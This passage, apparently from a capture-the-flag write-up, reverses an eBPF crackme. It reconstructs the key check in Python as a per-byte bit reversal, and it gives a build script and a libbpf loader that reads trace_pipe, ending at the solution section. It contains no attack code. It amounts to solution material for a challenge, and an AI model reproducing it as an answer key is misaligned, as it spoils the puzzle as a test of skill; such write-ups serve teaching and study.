&lt;p&gt;We can see some constants being loaded into  &lt;code&gt;r1&lt;/code&gt;  in each block, and that constant just happens to be the offset of the strings &amp;quot;Key is correct!&amp;quot; and &amp;quot;Key is incorrect!&amp;quot;, from the .rodata section.  &lt;code&gt;r2&lt;/code&gt;  just holds the length of the string to be printed.&lt;/p&gt;
&lt;p&gt;I don&#39;t want to get into too much detail about assembly level reversing here, so I will mention the required details, while trying to retain as much information as possible&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;r1 --&amp;gt; loop counter for byte by byte encryption&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r2 --&amp;gt; contains the pointer to current encrypted byte &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r3 --&amp;gt; is_correct flag &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;And, a python (almost line-by-line) representation of the encryption is as follows:&lt;br /&gt;
&lt;figure class=&#34;highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;check&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;r5&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r7 = r5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;[*] Initial state of r5: &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;:08b&amp;#125;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(r5)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r7 &amp;amp;= &lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r7 &amp;lt;&amp;lt;= &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r5 &amp;amp;= &lt;span class=&#34;number&#34;&gt;240&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r5 &amp;gt;&amp;gt;= &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r5 |= r7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r7 = r5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r7 &amp;amp;= &lt;span class=&#34;number&#34;&gt;51&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r7 &amp;lt;&amp;lt;= &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r5 &amp;gt;&amp;gt;= &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r5 &amp;amp;= &lt;span class=&#34;number&#34;&gt;51&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r5 |= r7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r7 = r5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r7 &amp;amp;= &lt;span class=&#34;number&#34;&gt;85&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r7 &amp;lt;&amp;lt;= &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r5 &amp;gt;&amp;gt;= &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r5 &amp;amp;= &lt;span class=&#34;number&#34;&gt;85&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r5 |= r7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;\n\n[*] Final state of r5: &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;:08b&amp;#125;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(r5)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;interacting-with-the-program&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#interacting-with-the-program&#34;&gt;#&lt;/a&gt; Interacting with the program?&lt;/h2&gt;
&lt;p&gt;This is all very nice, but what&#39;s a program that you cannot interact with?&lt;/p&gt;
&lt;p&gt;Well, since this is an eBPF program, it&#39;ll have to be loaded on the kernel and get past the verifier first, before we can actually make the syscall  &lt;code&gt;0x31337&lt;/code&gt;  to trigger it.&lt;/p&gt;
&lt;p&gt;How do we do that?&lt;/p&gt;
&lt;p&gt;You can use this loader file to load the program and simultaneously read  &lt;code&gt;trace_pipe&lt;/code&gt;  (where the outputs of  &lt;code&gt;bpf_trace_printk&lt;/code&gt; ) are logged.&lt;/p&gt;
&lt;p&gt;(Run this shell script first)&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo clang -O2 -target bpf -D__TARGET_ARCH_x86_64 -I . -c &lt;span class=&#34;string&#34;&gt;&amp;quot;&lt;span class=&#34;variable&#34;&gt;$1&lt;/span&gt;&amp;quot;&lt;/span&gt;_challenge.c -o &lt;span class=&#34;variable&#34;&gt;$1&lt;/span&gt;.o&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo bpftool gen skeleton &lt;span class=&#34;variable&#34;&gt;$1&lt;/span&gt;.o &amp;gt; &lt;span class=&#34;variable&#34;&gt;$1&lt;/span&gt;.skel.h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo clang -g -O2 -Wall -I . -c loader.c -o loader.o&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo clang -Wall -O2 -g loader.o libbpf/build/libbpf/libbpf.a -lelf -lz -o loader&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo ./loader&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;(Then, run this file to load the program)&lt;br /&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;sys/resource.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;bpf/libbpf.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;bpf/bpf.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;final.skel.h&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;read_trace_pipe&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; trace_fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	trace_fd = open(&lt;span class=&#34;string&#34;&gt;&amp;quot;/sys/kernel/debug/tracing/trace_pipe&amp;quot;&lt;/span&gt;, O_RDONLY, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (trace_fd &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;type&#34;&gt;ssize_t&lt;/span&gt; sz;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		sz = read(trace_fd, buf, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(buf) - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (sz &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			buf[sz] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;obj&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; err = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;rlimit&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;rlim&lt;/span&gt; =&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		.rlim_cur = &lt;span class=&#34;number&#34;&gt;512UL&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		.rlim_max = &lt;span class=&#34;number&#34;&gt;512UL&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	err = setrlimit(RLIMIT_MEMLOCK, &amp;amp;rlim);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (err) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;failed to change rlimit\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	obj = final__open();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!obj) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;failed to open and/or load BPF object\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	err = final__load(obj);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (err) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;failed to load BPF object %d\n&amp;quot;&lt;/span&gt;, err);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; cleanup;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	err = final__attach(obj);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (err) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;failed to attach BPF programs\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; cleanup;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	read_trace_pipe();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cleanup:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	final__destroy(obj);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; err != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Once loaded, you can write a python program to trigger the syscall with the arguments that you want to test it out (I used the   &lt;code&gt;ctypes&lt;/code&gt;  module for this)&lt;/p&gt;
&lt;p&gt;&amp;lt;br&amp;gt;&lt;/p&gt;
&lt;h2 id=&#34;the-solution&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#the-solution&#34;&gt;#&lt;/a&gt; The Solution&lt;/h2&gt;
&lt;p&gt;Once you understand how the program manipulates your input, reversing it becomes quite trivial. The program simply takes each byte of your input, flips the bits (8 padded), then compares it with a preexisting array.&lt;/p&gt;
